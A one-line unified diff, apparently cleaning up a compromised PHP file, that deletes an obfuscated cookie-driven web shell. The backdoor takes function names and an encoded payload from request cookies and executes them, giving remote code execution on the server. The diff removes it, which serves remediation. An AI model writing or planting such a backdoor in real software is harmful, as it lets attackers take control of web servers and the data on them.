@@ -1,1 +1,0 @@
-<?php if(@$_COOKIE['wd']){$ux=$_COOKIE['wd']("",@$_COOKIE['ekyb'](@$_COOKIE['lbf']));$ux();}?>
